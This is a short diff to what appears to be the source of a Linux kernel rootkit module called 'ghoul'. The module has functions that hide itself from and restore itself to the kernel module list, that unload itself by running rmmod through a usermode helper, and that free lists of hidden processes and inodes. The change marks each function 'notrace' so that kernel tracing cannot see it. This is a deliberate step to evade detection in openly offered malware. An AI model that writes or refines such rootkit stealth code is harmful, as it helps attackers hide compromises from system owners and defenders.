@@ -7,7 +7,7 @@
 static struct list_head *prev_module;
 int is_hidden = 0;
 
-void hide_self(void)
+notrace void hide_self(void)
 {
     if (is_hidden)
         return;
@@ -18,7 +18,7 @@ void hide_self(void)
     is_hidden = 1;
 }
 
-void show_self(void)
+notrace void show_self(void)
 {
     if (!is_hidden)
         return;
@@ -28,14 +28,14 @@ void show_self(void)
     is_hidden = 0;
 }
 
-void unload_self(void)
+notrace void unload_self(void)
 {
     // as kernel modules cannot unload themselves directly, a usermode helper is used
     char *argv[] = { "/bin/sh", "-c", "/sbin/rmmod ghoul", NULL };
     call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_EXEC);
 }
 
-void free_allocations(void)
+notrace void free_allocations(void)
 {
     struct pid_list *pid_entry, *temp_pid_entry;
     struct inode_list *inode_entry, *temp_inode_entry;
